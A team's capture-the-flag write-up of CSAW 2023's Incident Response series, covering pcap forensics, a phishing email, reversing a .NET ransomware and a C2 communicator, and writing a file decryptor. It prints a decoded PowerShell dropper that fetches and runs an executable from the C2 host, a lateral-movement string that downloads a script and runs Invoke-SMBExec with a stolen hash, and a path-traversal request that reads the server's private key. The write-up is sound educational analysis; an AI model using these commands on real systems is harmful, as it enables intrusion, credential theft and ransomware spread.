---
layout: post
title: Incident Response | CSAW CTF Quals 2023
description: Eight challenges. Twenty-two gigabytes of evidence. One private-key.txt.
author: Alexander Zhang, Andrew Kuai, Arnav Vora, Gary Song, Jason An, Ronak Badhe
tags: forensics web rev crypto pwn wireshark c# c++ windows python lfi rsa aes
---

Solving CSAW’23’s Incident Response was undoubtedly a team effort, involving the full breadth of knowledge we’ve learned on the team and on the job. From wrangling Virtualbox to writing the final decryptor, Incident Response was a hodgepodge of cursed Windows forensics, rev, and web, with a heaping of guess god and tomfoolery mixed in. Though it proved to be a bit unclear and guessy at times, IR still was an amazing setup to work through!

But before we can begin, we'll first need to download 22 gigabytes of "evidence"...

![why.png](/assets/posts/csaw-ir/SyJB1JB1a.png)

## Bro really downloaded an entire Windows Update in the background (by Ronak)

> The HudsonHustle company has contacted you as they are not able to figure out why they can not access any of their files. Can you figure out what is going on?

After setting my computer to download and unzip `evidence.zip` while I slept, I booted up good ol `wireshark` and started analyzing the `1 GB` pcap.

First thing I notice is that the pcap has a lot of `tcp` streams and that a lot of the streams are also `http`. I proceeded to start right clicking on each packet and clicking `follow stream`.

![follow stream](/assets/posts/csaw-ir/HJ45uDrya.png)

I found many streams, a lot of which were downloading from `/filestreamingservice` from a microsoft url. I assumed that these were just normal windows updates.

After a lot of trial and error (and noticing there are 1000 tcp streams), I decided to try searching for packets containing `csaw` using the query `frame contains "csaw"` as this ctf is `csaw`ctf.

![infected phishing](/assets/posts/csaw-ir/Bk4YFvrJ6.png)

I found the subdomain `infected-phishing.csaw.io` which I visited and was promptly rickrolled.

![csaw domains](/assets/posts/csaw-ir/H1WpFvSJa.png)

Now THIS is more like it. It seems like there is some domain which serves static files to download like `coms.exe` and `static.html`.

![static.html stream](/assets/posts/csaw-ir/H1GG9wrJT.png)

It seems like there is a `static.html` that the infected user visited which does a mysterious redirect to a `ms-msdt` url that executes a command. We also see a subdomain `infected-c2.csaw.io` which seems to be running the `uvicorn` server.

Going to https://infected-c2.csaw.io/, I see following error in Firefox.

![404 error](/assets/posts/csaw-ir/rklkjvrkp.png)

That 404 error looks suspiciously like the fastapi default 404 error (which I know from painful personal experience) and fastapi also runs on uvicorn which further gives evidence to this server being written with fastapi. By default, fastapi exposes a `/docs` which has swagger auto-generated endpoint documentation, so I went to https://infected-c2.csaw.io/docs and:

![api docs](/assets/posts/csaw-ir/HJq8iwSkT.png)

Voila! We now have all the endpoints of the suspicious server.

![static.html](/assets/posts/csaw-ir/Bkxh9jwByp.png)
```shell=
[rbadhe@ar2ch ~]$ echo SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vaW5mZWN0ZWQtYzIuY3Nhdy5pby9zdGF0aWM/ZmlsZT1jb21zLmV4ZSAtT3V0RmlsZSBDOlxVc2Vyc1xQdWJsaWNcY29tcy5leGU7U3RhcnQtUHJvY2VzcyBDOlxVc2Vyc1xQdWJsaWNcY29tcy5leGUgLVZlcmIgcnVuQXM7U2V0LUNvbnRlbnQgLVBhdGggQzpcVXNlcnNcUHVibGljXGNvbXMuZXhlIC1WYWx1ZSAoJzAnKigoR2V0LUNvbnRlbnQgLVBhdGggQzpcVXNlcnNcUHVibGljXGNvbXMuZXhlKS5MZW5ndGgpKTtSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggQzpcVXNlcnNcUHVibGljXGNvbXMuZXhlOw== | base64 -d
Invoke-WebRequest -Uri http://infected-c2.csaw.io/static?file=coms.exe -OutFile C:\Users\Public\coms.exe;Start-Process C:\Users\Public\coms.exe -Verb runAs;Set-Content -Path C:\Users\Public\coms.exe -Value ('0'*((Get-Content -Path C:\Users\Public\coms.exe).Length));Remove-Item -LiteralPath C:\Users\Public\coms.exe;
```

Decoding the base64 of the redirect in `static.html`, we see that the command downloads `coms.exe`, runs it with privileges, zeros the file, and then deletes it. This is VERY suspicious behaviour so we can be confident this is our virus.

Looking through the pcap further, I see `runs0mewhere.exe` and `lat.ps1` also being downloaded after a `POST` request to `/process_minidump`. I extracted the file uploaded to the server and tried analyzing it in windbg. The only thing I could find from the dump is that it involves `lsass.exe`, the dump is named `FXSTIFFDebugLogFileAdmin.txt`.

![process_minidump request](/assets/posts/csaw-ir/ryBA6Pr16.png)

As I tried figuring out what this dump file is, windows kept deleting my dump saying something about `system32/lsass.exe`, trojans, and that the file needs to be exterminated. I passed the `coms.exe` and `runs0mewhere.exe` to my teammates for revving to figure out what they are doing.

![js0n help](/assets/posts/csaw-ir/S1MeJdr16.png)


At the end of the `/process_minidump` request, we see that the server sends back some base64.

![process_minidump](/assets/posts/csaw-ir/SyuI1OSJT.png)


When I decoded the base64, I just got some incomprehensible suspicious bytes. It must be encrypted somehow. Since after this post request, the next request to the server downloaded `runs0mewhere.exe` and `lat.ps1`, these bytes somehow tell `coms.exe` to download the later stages.

At the end of all of the frames containing "csaw", there is below request:

![ransome note.png wireshark](/assets/posts/csaw-ir/rkV5edHk6.png)

Downloading the image gives us the first flag.

![ransome_note.png](/assets/posts/csaw-ir/ByPaedBk6.png)

Also, a side note: Wireshark has this really cool feature I stumbled upon during writeup where it can extract all http requests:

![navigate to requests](/assets/posts/csaw-ir/BJW9buHJT.png)
![requests information](/assets/posts/csaw-ir/SkbRbdBJp.png)

Knowing this would have really helped save a lot of effort going through the pcap in this challenge :)

## The Mystery of John Snow (by Gary)

> Wait, what is Windows installation cleaning? Is it cleaning my Linux partition?
> 

~ Ronak

The next point of interest was the two vmdk files that were provided in the zip file. To give us an idea of what we are looking for, the challenge mentioned that emails were likely the point of attack. Our intial idea was to launch the vm and attempt to sign into the account to view their email inbox. Unfortunately, the account was password protected. Fortunately, there is actually a way to break into an account on a windows computer using the windows recovery tool. Unfortunately, this didn't work (which we later found out was because the command Net user was actually encrypted).

Our next idea was to just open up the vmdk file using 7zip to examine the files. Opening the user's vmdk shows a list of partitions
![](/assets/posts/csaw-ir/BylEgz5ba.png)
Most of these are just window's recovery partitions. The only one we really care about is 1.ntfs. Opening it gives us a plethora of files to look through
![](/assets/posts/csaw-ir/rkSuefq-p.png)
Funny enough, the hahaha.png is the ransom note from the previous part so we could've done both challenges purely with the vmdk files. 

We know that a user's data is stored in the Users file in windows, so we look into the user "johnsnow"'s files (this was the user listed when we opened it in the vm). In his documents folder we find an outlook dump. If you don't know, Outlook is an email service. It seems that we found our guy
![](/assets/posts/csaw-ir/ByNwZz5bT.png)

My first idea was to open the outlook on my computer to examine the emails, but my team mates told me this probably wasn't a good idea since we were told it contains malware. I decided to begrudgingly send the file to Alex for him to analyze.




## Unveiling MILF: Your Irresistible Cybersecurity Temptress (by Alex)

> `Augeust`
> 

~ Alex

We now have a Microsoft Outlook file that probably contains the email which we're looking for, but Outlook doesn't support opening standalone PST files and the file in a binary format so we can't just read it with a text editor. I searched for software that can read PST files and found the [`readpst`](https://www.five-ten-sg.com/libpst/rn01re01.html) tool from [libpst](https://www.five-ten-sg.com/libpst/), which can convert PST files into the plain text mbox format. 

After running `readpst`, I opened the resulting mbox file and found a ton of emails inside. It looks like this is the inbox of a company called Hudson Hustles, which offers jet ski rides on the Hudson River. Many of the emails were business related, and there were also lots of spam emails, some of which were quite *interesting*:

```
From: contact@pwnhub.com
To: hudsonhustles844@gmail.com
Subject: Unlock Hidden Pleasures with PWNhub!
...

Hello there,


Are you ready to penetrate the world of excitement and gain backdoor access to unparalleled pleasure? Look no further than PWNhub, the ultimate destination for those seeking thrilling adventures and secret treasures!

At PWNhub, we're all about mastering the art of penetration (penetesting, of course!) and providing you with the keys to unlock hidden desires. Our platform offers a tantalizing array of content, from exclusive tutorials that reveal forbidden knowledge to challenges that will test your skills in the most delightful ways.

Why choose PWNhub?

*       Penetrate the depths of expertise and uncover secrets you never knew existed.
*       Connect intimately with a community that shares your insatiable curiosity.
*       Discover the thrill of exploration and indulge in your wildest fantasies.

Don't let this opportunity slip through your fingers! Join PWNhub today and gain the backdoor access you've been yearning for. It's time to elevate your pleasure game to a whole new level.

Ready to explore? Visit our website at www.pwnhub.com <https://infected-phishing.csaw.io/>  and become a part of our passionate community.

Stay curious, stay PWNing!

Best regards,
The PWNhub Team
```

```
From: info@cyberguardsolutions.com
To: hudsonhustles844@gmail.com
Subject: Unveiling MILF: Your Irresistible Cybersecurity Temptress
...

Introducing MILF - Your Irresistible Cybersecurity Temptress!


Dear [Recipient's Name],

Are you feeling vulnerable in a world full of cyber threats? Concerned that your secrets might be exposed without warning?

Prepare to be seduced by MILF (Multi-Layered Information Leakage Firewall), the alluring cybersecurity guardian that promises to keep your data's secrets locked away.



Discover the tantalizing features of MILF:

*       Advanced Threat Detection that knows how to handle a breach
*       Multi-Layered Data Encryption that wraps your data in an irresistible embrace
*       Real-time Monitoring and Alerts that keep you in the know
*       User-Friendly Interface that's easy to get intimate with

Don't resist the temptation. Let MILF seduce you into protecting your sensitive information.

For a rendezvous or a private consultation, reach out to our enchanting experts at info@cyberguardsolutions.com <mailto:info@cyberguardsolutions.com>  or call us at +1-555-123-4567.

Stay safe, stay enchanted with MILF!

Yours sensually,

Your CyberGuard Solutions Team
```

We tried the subjects of the first couple of emails but none of them worked, so I grepped out all of the subject lines and Ronak wrote a script to try them one by one. Here's the list of subject lines:

```
Subject: Monthly Finance Report - August
Subject: Claim Your Free Amazon Gift Cards Now!
Subject: Explore the Excitement at CyberSecPark!
Subject: Unlock Hidden Pleasures with PWNhub!
Subject: Help Save Fish - They Need Air to Survive!
Subject: Join the Fight Against the Color Green!
Subject: Car in Jet Skis
Subject: Introducing Despacino - The Ultimate Coffee Experience
Subject: Discover the Excitement: "Why Board Games Are Boring" Article
Subject: Request to Turn the Hudson River Shallow
Subject: Enquiry about Hudson Hustles Jet Ski Models
Subject: Enquiry about Jet Ski Rental
Subject: Urgent: Request to Remove Boats from Hudson River
Subject: Competitor Inquiry
Subject: Monthly Finance Report - July
Subject: Re: Jet Ski Enquiry
Subject: Discover the Irresistible Taste of Our Mattresses
Subject: Enquiry: Biology Assignment Questions
Subject: Enquiry and Complaint Regarding Hudson Hustles Jet Ski Services
Subject: Permission Request
Subject: LET ME STEAL PLEASE
Subject: Copyright Infringement Notice
Subject: Enquiry/Complaint: Jet Ski Seat Replacement
Subject: Join Our Campaign Against Jet Skis in the Hudson River
Subject: =?utf-8?q?Discover_Petscop_-_A_Game_About_Life_and_Death_ARG_=F0=9F=8E=AE=F0=9F=8C=9F?=
Subject: Concerns About Mini Jetskis
Subject: Urgent Legal Notice - Immediate Attention Required
Subject: Fight Legal Lawsuits with Saul Goodman & Associates
Subject: Sharks in Hudson River Concern
Subject: Give Your Beloved Fish a Heavenly Farewell
Subject: Enquiry/Complaint about Ski Height
Subject: Enquiry Regarding Police Request for Jet Skis
Subject: Join the Birthday Party Campaign for a Brighter Tomorrow
Subject: Question about Dog Riding on Jet Skis
Subject: Concerns Regarding Jet Ski Size
Subject: Explore the Wonders of Spain: The Eiffel Tower Experience
Subject: Exciting News: Join Kool Kids Club Today!
Subject: Enquiry about Hudson Hustles and Jet Skis
Subject: Inquiry About Eco-Friendliness of Jet Skis
Subject: Introducing Communopoly - The Monopoly Game with Attachments!
Subject: Subject: Enquiry/Complaint - Hudson Hustles Jet Ski Rentals
Subject: Protect Yourself from Scams with Scam Cam Capture!
Subject: Join the Pizza Party: Unbelievable Promises Await!
Subject: Legal Notice: Potential Lawsuits and Complaints
Subject: Find Your Lost Pet with PetSearchers!
Subject: Lost Camera in the River
Subject: Subject: Inquiry about Hudson Hustles Services
Subject: Notice of Copyleft Infringement
Subject: Enquiry/Complaint about Hudson Hassles Jet Skis
Subject: Enquiry/Complaint: Jet Ski Fuel Level
Subject: Unveiling MILF: Your Irresistible Cybersecurity Temptress
Subject: Concerns Regarding Excessive Ads
Subject: Concerns Regarding Damage on Docks
Subject: Enquiry/Complaint: Missing Handle on Jet Ski
Subject: Potential Legal Action and Warnings
Subject: Enquiry about Hudson Hustles Headquarters
Subject: Exciting Jet Ski Adventures Await You!
Subject: Enquiry/Complaint: Availability of Jet Skis
Subject: Concerns Regarding Jet Ski Charges
Subject: Monthly Finance Report - June
Subject: Exciting Opportunity: Google Ads Account Setup!
Subject: Exciting New Offer from Amazon
Subject: Enhance Your Account Security with SecureSign
Subject: Notice of Potential Lawsuit - Damages to Sign
```

The correct subject line turned out to be `Monthly Finance Report - July`. The contents of the email looked like this:

```
From: felicia_finance@felicia.com
To: hudsonhustles844@gmail.com
Subject: Monthly Finance Report - July
...

Hello Hudson Hustles,

We hope this email finds you well. We sincerely apologize for the delay in sending out our Monthly Finance Report for July. We understand the importance of timely information, and we appreciate your patience in this matter.

**Financial Overview:**
- Total Revenue: $78,450
- Total Expenses: $49,700
- Net Profit: $28,750

**Key Highlights:**
1. Surging Demand for Rentals: This month, we experienced a substantial increase in jet ski rentals, contributing to the boost in our revenue.
2. Streamlined Operational Costs: We've successfully implemented cost-saving measures in various operational areas, leading to greater resource efficiency and a more robust bottom line.
3. Investment Seminar Success: Our Investment Insights team conducted a highly successful seminar on navigating current market trends, receiving rave reviews and attracting potential new clients.

**Outlook for August:**
Looking ahead to August, we remain committed to building on our successes this month. We plan to expand our service offerings and continue growing our client base.

Please don't hesitate to reach out if you have any questions or require more detailed information. We value your partnership and trust in Felicia Finance.

Best regards,
Felicia Finance Team
```

There is an attachment called `Hudson_Hustles_Financial_Report_July_2023.doc` and the next question asked for its SHA1 hash, so we decoded the base64 blob to get the original file. Then the server asked for the CVE ID of the vulnerability exploited by the attachment, which I got by [uploading the attachment to VirusTotal](https://www.virustotal.com/gui/file/143aca90ae6d676322dada510ea391093b899eabad359f26862cddafc1662580). The last question asked for the name of the file downloaded by the exploit, which turns out to be the `coms.exe` that we found earlier. The flag for this part was `csawctf{ph15h1n6_15_7h3_m057_c0mm0n_v3c70r}`.

## Running Somewhere (by Andrew)

> we have rev'd runs0mewhere but are stuck at a guess god question tangentially related to the actual executable
> 

~ Andrew

Our next task is to figure out exactly what the Ransomewhere - or should I say `runs0mewhere.exe` - does. After popping the executable into Binja, I immediately noticed that it was an _unstripped_ executable - wooo!
![wmain](/assets/posts/csaw-ir/Bk7Ef1BkT.png)
If we ignore the error handling, `wmain` basically boils down to a call to `exe_start`, which is a _very_ long method. But scrolling down through it, I noticed a couple of references to C# and something called a "Single-File bundle":
![exe_start](/assets/posts/csaw-ir/Bye5GySJT.png)
Googling `c# single file bundle` gives [this .NET doc page](https://learn.microsoft.com/en-us/dotnet/core/deploying/single-file/overview), and Googling `c# single file bundle extractor` gives [this SO answer](https://stackoverflow.com/a/69993722), which links a package called [SFExtract](https://www.nuget.org/packages/sfextract/), which does exactly what we need it to:

```
$ dotnet tool install -g sfextract
$ pacman -S dotnet-sdk-6.0
$ sfextract runs0mewhere.exe --output runs0mewhere-extracted.exe    
Entry point: runs0mewhere.dll
Bundle version: 6.0
Extracted 168 files to "runs0mewhere-extracted.exe"
```
Now all we have to do is to pop the extracted `runs0mewhere.dll` into a C# IL reader like [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy), and we basically have the source code!
![ilspy for the win](/assets/posts/csaw-ir/BkiJUJBJp.png)
Man, why can't all rev be this easy?

```diff
 $ nc misc.csaw.io 5002
 We need to understand this ransomware. Please answer these questions for us
 (1/5) What file extensions are not encrypted by the ransomware? Please give the answer as a comma-separated array
+.exe,.dll,.lnk,.sys,.msi,.EXTEN,.ost,.pst
 (2/5) What folders are not encrypted by the ransomware? Please give the answer as a comma-separated array
+tmp,winnt,temp,thumb,$Recycle.Bin,System Volume Information,Boot,Windows,Downloads
 (3/5) This ransomware appears to be similar to another type of ransomware out there. Can you tell me which one?
```
At this point, we hit a roadblock. As far we could tell, the above code was entirely handrolled. What could possibly be the answer here?
Googling around, Jason found that there's a similar virus called _Rapid_ that also does RSA/AES encryption, but that isn't the correct answer. In fact, it seems that [most modern ransomware](https://medium.com/@tarcisioma/ransomware-encryption-techniques-696531d07bb9) use incredibly similar encryption techniques! It wasn't until I googled the `.EXTEN` extension that this code appends to encrypted files that we found the answer - the `conti` family, which also uses `.EXTEN`.

```diff
+conti
 (4/5) What encryption algorithms are used by the ransomware? Please give the answer as a comma-separated array
+AES-CBC,RSA
 (5/5) Is it realistically possible to recover the files using only the source code? Please answer as either yes or no
+no
 Nice Job! Thanks for explaining the ransomware to us.
 Here's your flag --> csawctf{c0n71_r4n50mw4r3_1n_c#}
```

## Extreme Comfusion (by Jason)

> staring at stripped windows c++ is going to make me gouge my eyes out
> 

~ Jason

Given the communicator binary from before, our first question is to find the name of the process it's dumping memory for. Since stripped C++ is painful to look at, I just clicked into random functions until I found the main function at `140001850`. The main function loads some random data, then calls the function at `140001620` on it, which from squinting at I guessed to be a C++ string allocation function due to the call to `new`, and then calls the function at `140004d60`, which looks like a single-byte XOR function where the byte to XOR with is the third argument.

Dumping the data in main and xoring with 0x33, we get the string `C:\Windows\Temp\FXSTIFFDebugLogFileAdmin.txt`. I recognized the filename from the pcap so I kept this in mind for later. Main then calls the function at `140001270` which looks like another C++ stdlib function so I ignored it, then moved onto the function at `140004920` which has a lot more stuff. The function checks for the `SeDebugPrivilege` privilege, which would allow a program to debug other programs, so it seems like this function will do the dumping. Skimming the function, there's more calls to the single-byte XOR, so I dump the data to get the string `lsass.exe`, which is the answer to the first part.

The next part asks for the full path to the dumped file. This is just `C:\Windows\Temp\FXSTIFFDebugLogFileAdmin.txt` from before.

The next part asks for the first 32 characters of the base64 command being run from the server. At this point it's possible to reverse engineer the binary to figure out how the communication scheme works, but I was growing weary of stripped C++ so I decided to check out the website, and promptly found this:

![An image of Jason sending a link demonstrating LFI in the infected-c2.csaw.io site](/assets/posts/csaw-ir/BJI5WyrJp.png)

Yep. Their web server has LFI. After trying a bunch of files, I found `../Dockerfile` which led me to `../web.py` which had the full source of the web server. This reveals the command being run:
```python
LATERAL_MOVEMENT = "New-Module -Name LaTm0v -ScriptBlock ([Scriptblock]::Create((New-Object " \
                   "System.Net.WebClient).DownloadString(\"http://infected-c2.csaw.io/static?file=lat.ps1\"))); " \
                   "Invoke-SMBExec -Target \"{ip}\" -Domain \"{domain_name}\" -Username \"{username}\" -Hash \"{" \
                   "ntlm}\" -Command \"{ransomware}\""
```
Base64 encoding this and taking the first 32 characters we get the answer `TgBlAHcALQBNAG8AZAB1AGwAZQAgAC0A`.

The next part asks for the files that are being pulled. From reading the source we can determine that it's just `lat.ps1` and `runs0mewhere.exe`, which is the answer.

The next part asks for the algorithm used to decrypt the command. The web server source reveals that it's `RC4`.

The final part asks about the key used to decrypt the command. Unfortunately, this actually takes reversing work to do. Fortunately, now that I know it's RC4, it's a lot easier to reverse the binary. After clicking into a bunch of functions in main, I found that `140004630` is the RC4 keystream generation algorithm and `1400045a0` is the actual cipher algorithm. At this point, I patched out the process dump code by jumping over it, asked my teammate Andrew to break at the start of the RC4 keystream function, and then just dump the key passed in. The first key was `didufindme???` but this was used to decrypt the actual key which was `!!!!!w0wURG0od@r3v__:O:O`, giving us the flag.

## flag.txt (by Gary)

> @everyone There's currently an issue with one of our Incident Response challenge servers, so if you encounter a non-responsive server or timeouts that may be the problem. We're working on a fix, and will let you know when it's back up.
> 

~ cosmicdoge (organizer)

We then unlocked the challenge "C2 server", which had a problem statement asking us to "hack the hackers". We had already found the C2 server using LFI in the previous challenges, so all that was left was to find out what we were supposed to do to it. At first, the problem statement led us to think we had to execute an RCE on the server. However, one of my team mates joked about the idea that maybe the flag was just in the path `web/flag.txt`. Once the infra was back up, I decided to check it out and was met with the following text.

![flag](/assets/posts/csaw-ir/rJaXUSLy6.png)

seems like a flag to me

## Final Decryption (by Andrew)

> the g in [g.ucla.edu](http://g.ucla.edu/) stands for GAMER 😎 😈
> 

~ Arnav

The last part of this challenge is to recover the ransom'd files on both the server and client. From the source code of `runs0mewhere.exe` we found above, we know that the encryption scheme is basically

```
a = [128 random bits]
b = [128 random bits]
file = (
  rsa(public_key = "<above>", data = a + b) +
  aes(key = a, iv = b, data)
)
```

Thus, all we need is the hackers' private key to decrypt any file. Now, where exactly could such a key be?

![gary forgor](/assets/posts/csaw-ir/SkJLh1Sk6.png)

Sure enough, https://infected-c2.csaw.io/static?file=../../web/private_key.txt is an RSA private key. Now all I have to do is to take the encryptor and reverse its logic, and we have a decryptor!

```cs
// hustle/Program.cs
using System.Security.Cryptography;

public class Decrypt {
    public static void Main(string[] args) {
        if (args.Length == 0) {
            Console.Error.WriteLine("no file provided uwu");
            return;
        }
        if (!args[0].EndsWith(".EXTEN")) {
            Console.Error.WriteLine("no .EXTEN uwu");
            return;
        }
        var bytes = File.ReadAllBytes(args[0]);
        using var rsa = new RSACryptoServiceProvider(4096);
        rsa.ImportFromPem(CERT.ToString());
        var rgb = rsa.Decrypt(bytes[..(4096 / 8)], fOAEP: true);
        var array1 = rgb[..(128 / 8)];
        var array2 = rgb[(128 / 8)..];

        using var aes = new RijndaelManaged();
        aes.BlockSize = 128;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        using var transform = aes.CreateDecryptor(array1, array2);
        using var memoryStream = new MemoryStream();
        using var cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
        cryptoStream.Write(bytes[(4096 / 8)..], 0, bytes.Length - (4096 / 8));
        cryptoStream.FlushFinalBlock();

        var filename = Path.GetFileName(args[0])!.Replace(Path.GetExtension(args[0]), "");
        if (filename == "") {
            filename = "file";
        }
        File.WriteAllBytes(
            filename,
            memoryStream.ToArray()
        );
    }
    static string CERT = @"
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEApJDTDZg7SIi/SL9ppTW2QgJ2JNOLtGx8wMP2Ueck38yrizw8
<...snip...>
RSSPh42niXuNIsbbFSOb/1jVfSDhB33MY0odlxwrspdZUML8Vr3DzQ9U2Gsp
-----END RSA PRIVATE KEY-----
";
}
```

Usage: `find <folder> | xargs -n 1 hustle`

Sprinkle in a bit of shell scripting help from Ronak, and now all we have to do is to find some interesting files to decrypt. Gary earlier had noticed a `flag.enc` file on the server, so we'll start with that:

```bash
$ hustle /home/arc/mount/Users/Administrator/Desktop/server-backup/hustlers/static/hustlers/flag.EXTEN
```

![flag.EXTEN](/assets/posts/csaw-ir/rJyVJeHkT.jpg)

I- how- what-

```bash
$ find "/home/arc/mount/Users/Administrator/Desktop/server-backup/" | xargs -n 1 hustle
```

The folder containing that flag.jpg file seems to be an incomplete Django web app. Looking through the server files, the decrypted `views.py` reads

```python
from django.shortcuts import render
from django.http import HttpResponse
from django.contrib.auth import authenticate, login, logout
from .models import Reservation
from django.contrib.auth.decorators import login_required

# Create your views here.

# hey if you are a ctf player and have reached this point, good job! 
# you might want to check in the place where django conventially stores static files 
```

Besides `flag.jpg`, there's two other images under `static/`. Gary's intuition was that the Tiger Woods image is what we want. He's right!

![tiger woods flag](/assets/posts/csaw-ir/r1-Hegry6.jpg)

In a similar vein, the most interesting files on the client seem to be in the Desktop folder.

```bash
$ find '/home/arc/mount/Users/johnsnow/Desktop/' | xargs -n 1 hustle
```

Besides a bunch of Hudson Hustlers Rental logs, there's also two PDF flyers. And sure enough, `Hudson_Hustles_new_flyer.pdf` has our final flag!
![Hudson_Hustles_new_flyer flag](/assets/posts/csaw-ir/HkHvWgByT.png)
